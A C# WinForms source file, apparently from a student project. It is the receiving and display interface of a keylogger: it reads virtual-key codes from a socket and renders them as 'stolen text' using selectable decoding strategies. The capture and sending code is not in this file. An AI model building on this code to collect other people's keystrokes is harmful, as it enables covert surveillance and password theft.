/*
 * Author: Serediuc Andrei-Gheorghe
 * Date : 26.05.2024
 */


using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using LoggerDLL;
using SocketDLL;

namespace UIModule
{
    public partial class InterfataSimpla : Form
    {
        private LoggerWriter _log;
        private String TempFile;
        private int[] BufferCaractere = new int[5000];
        private int NumarCaractere = 0;
        public InterfataSimpla(LoggerWriter log)
        {
            var assembly = Assembly.GetExecutingAssembly();
            var resourceName = "UIModule.res.Key_Logger.chm";
            // Create a temporary file to hold the embedded resource
            TempFile = Path.Combine(Path.GetTempPath(), "Key_Logger.chm");
            using (Stream resourceStream = assembly.GetManifestResourceStream(resourceName))
            using (FileStream fileStream = new FileStream(TempFile, FileMode.Create, FileAccess.Write))
            {
                resourceStream.CopyTo(fileStream);  
            }

                InitializeComponent();
            _log = log;
            ModAfisare.DropDownStyle = ComboBoxStyle.DropDownList;
            TextFurat.ReadOnly = true;
            ModAfisare.SelectedIndex = 0;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch(ModAfisare.SelectedIndex)
            {
                case 0:
                    {
                        _log.SetStrategy(new VKCodeStrategy());
                        break;
                    }
                case 1:
                    {
                        _log.SetStrategy(new ToStringStrategy());
                        break;
                    }
                case 2:
                    {
                        _log.SetStrategy(new ToCharStrategy());
                        break;
                    }
                case 3:
                    {
                        _log.SetStrategy(new SmartStrategy());
                        break;
                    }
            }
            TextFurat.Text = "";
            for (int i = 0; i < NumarCaractere; i++)
            {
                _log.HandleVK(BufferCaractere[i], "", TextFurat);
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string TastePrimite = SocketReceiver.CitesteDate();
            SocketDebug.Text = SocketReceiver.ExceptieSochet;
            if (TastePrimite != "")
            {
                String[] vkCodeStr = TastePrimite.Split(' ');
                foreach (String code in vkCodeStr)
                {
                    if (code != "")
                    {
                        int vkCode = Int16.Parse(code);
                        BufferCaractere[NumarCaractere] = vkCode;
                        NumarCaractere++;
                        _log.HandleVK(vkCode, "", TextFurat);
                    }
                }
            }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Exit_Click(object sender, EventArgs e)
        {

            Help.ShowHelp(this, TempFile);
            

        }

        private void SocketDebug_TextChanged(object sender, EventArgs e)
        {

        }

        private void ButonClear_Click(object sender, EventArgs e)
        {
            BufferCaractere = new int[5000];
            NumarCaractere = 0;
            TextFurat.Text = "";
        }

        private void ModAfisare_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = true;
        }
    }
}
